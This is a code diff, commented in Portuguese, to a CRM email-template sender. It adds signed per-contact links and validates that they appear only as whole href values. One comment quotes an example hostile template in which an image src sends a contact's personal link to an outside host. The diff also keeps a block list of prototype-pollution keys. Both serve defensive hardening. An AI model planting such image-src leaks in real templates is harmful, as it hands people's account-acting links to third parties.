@@ -92,6 +92,33 @@ export interface DependenciasAcaoEmail {
   enviadoNas24h(templateId: string, email: string): Promise<boolean>;
   enviar(payload: PayloadEmailWebhook): Promise<{ ok: boolean; status: number; corpo: unknown }>;
   resolverVariavel(modelo: string, dados: unknown): string;
+  /**
+   * Links PESSOAIS do contato para este modelo (27/11/2026, cadência por pós v2): a agenda
+   * (`link_agenda_reuniao`), o cronograma (`link_cronograma`) e cada opção de resposta
+   * (`link_resposta_<n>`). Quem assina é o banco (`crm_cadencia_email_links`). Só é chamado
+   * quando o modelo usa alguma dessas variáveis; o que não vier fica com o fallback do modelo.
+   */
+  linksPessoais?(leadId: string, templateId: string): Promise<Record<string, unknown> | null>;
+}
+
+/** Variáveis de link pessoal que o envio monta sozinho (ninguém mapeia na tela). */
+export const VARIAVEL_LINK_PESSOAL = /^(?:link_agenda_reuniao|link_cronograma|link_resposta_[0-9]{1,2})$/;
+const USA_LINK_PESSOAL = /\{\{\s*(?:link_agenda_reuniao|link_cronograma|link_resposta_[0-9]{1,2})\b/;
+
+/**
+ * O link pessoal só entra quando é o endereço INTEIRO de um `href` (e, no texto puro, onde for).
+ * Dentro de `src` de imagem, no meio de outro endereço ou no assunto ele sairia do e-mail sem
+ * o contato clicar — um modelo editado com `<img src="https://fora/?x={{link_resposta_1}}">`
+ * entregaria o link de cada pessoa a um terceiro, e o link permite agir em nome dela. Usado de
+ * outro jeito, a variável fica sem valor e vale o fallback do modelo.
+ */
+export function linkPessoalBemUsado(nome: string, template: Pick<TemplateEmail, "assunto" | "corpo_html">): boolean {
+  if (!VARIAVEL_LINK_PESSOAL.test(nome)) return false;
+  const tag = new RegExp(`\\{\\{\\s*${nome}\\b[^{}]*\\}\\}`, "g");
+  const comoHref = new RegExp(`<a\\b[^<>]*?\\bhref\\s*=\\s*(["'])\\{\\{\\s*${nome}\\b[^{}]*\\}\\}\\1`, "gi");
+  if (tag.test(template.assunto ?? "")) return false;
+  const html = template.corpo_html ?? "";
+  return (html.match(tag) ?? []).length === (html.match(comoHref) ?? []).length;
 }
 
 /** `enviadoNas24h` no banco. O e-mail chega normalizado (como é gravado); o filtro por
@@ -227,6 +254,21 @@ export async function executarEnvioModeloEmail(entrada: {
       "contato.nome": nome, "contato.primeiro_nome": primeiroNome, "contato.email": email,
       "contato.telefone": telefone, "curso.nome": curso,
     });
+    // Links pessoais: só o endereço https assinado pelo banco entra. Falhou ou não veio, o
+    // modelo usa o fallback dele (agenda geral, PDF do cronograma) — o e-mail não deixa de sair.
+    if (deps.linksPessoais
+      && [template.assunto, template.corpo_html, template.corpo_texto ?? ""].some((texto) => USA_LINK_PESSOAL.test(texto))) {
+      try {
+        const links = await deps.linksPessoais(lead.id, params.template_id);
+        for (const [nomeLink, endereco] of Object.entries(objeto(links) ? links : {})) {
+          if (VARIAVEL_LINK_PESSOAL.test(nomeLink) && typeof endereco === "string"
+            && /^https:\/\/[^\s"'<>{}]{1,600}$/.test(endereco)
+            && linkPessoalBemUsado(nomeLink, template)) variaveis[nomeLink] = endereco;
+        }
+      } catch {
+        /* sem link pessoal: vale o fallback do modelo */
+      }
+    }
     // Fluxo/automação: a regra de quem recebe é do fluxo — dado que faltar sai em branco.
     const emBranco = variavelSemValorSaiEmBranco(contexto.tipo);
     const mapeadas = params.variaveis ?? {};
@@ -238,6 +280,11 @@ export async function executarEnvioModeloEmail(entrada: {
       for (const m of texto.matchAll(VARIAVEL_MODELO)) if (m[2] !== undefined || m[3] !== undefined) comFallback.add(m[1]);
     }
     for (const [chaveVariavel, modelo] of Object.entries(mapeadas)) {
+      // Nome reservado, como `descadastro_url`: o link pessoal é do sistema. Valor mapeado para
+      // ele (inclusive vindo do payload público de uma página de captação) é ignorado — senão um
+      // endereço escolhido por terceiros sairia num e-mail assinado pela casa, ou um valor vazio
+      // apagaria o link do contato.
+      if (VARIAVEL_LINK_PESSOAL.test(chaveVariavel)) continue;
       if (!VARIAVEL.test(chaveVariavel) || ["descadastro_url", "__proto__", "prototype", "constructor"].includes(chaveVariavel)
         || typeof modelo !== "string" || modelo.length > 10_000) return resultado("ignorado", "variaveis_invalidas");
       // Resolver o texto inteiro sem validar cada token mascararia "Olá {ausente}".
@@ -245,7 +292,12 @@ export async function executarEnvioModeloEmail(entrada: {
       const valor = deps.resolverVariavel(modelo, entrada.dados);
       if (/\{webhook=|\{\{|\}\}/i.test(valor)) return resultado("ignorado", "variavel_ausente");
       if (tokenVazio || !valor.trim()) {
-        if (emBranco || comFallback.has(chaveVariavel)) continue;
+        // Com fallback no modelo, o valor que resolveu vazio cede a vez ao fallback — inclusive
+        // quando a variável tem valor automático do contato: `{primeiro_nome_limpo}` recusa
+        // "teste" ou "MV 123", e antes o e-mail saía com essa 1ª palavra crua em vez do "Olá"
+        // do modelo (27/11/2026).
+        if (comFallback.has(chaveVariavel)) { variaveis[chaveVariavel] = ""; continue; }
+        if (emBranco) continue;
         return resultado("ignorado", "variavel_ausente");
       }
       if (valor.length > 10_000) return resultado("ignorado", "variaveis_invalidas");
